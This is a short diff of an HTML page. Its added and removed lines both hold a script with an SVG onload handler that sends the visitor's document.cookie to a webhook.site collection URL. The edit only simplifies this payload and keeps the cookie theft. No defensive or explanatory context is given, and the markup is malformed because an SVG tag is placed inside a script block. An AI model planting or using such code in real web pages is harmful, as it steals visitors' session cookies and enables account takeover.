@@ -5,9 +5,7 @@
 </head>
 <body>
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const cookies = params.get('cookies');
-        <svg onload="window.location.href='https://webhook.site/your-webhook-id?cookies=' + encodeURIComponent(document.cookie) + cookies"></svg>
+        <svg onload="window.location.href='https://webhook.site/your-webhook-id?cookies=' + encodeURIComponent(document.cookie)"></svg>
     </script>
 </body>
 </html>
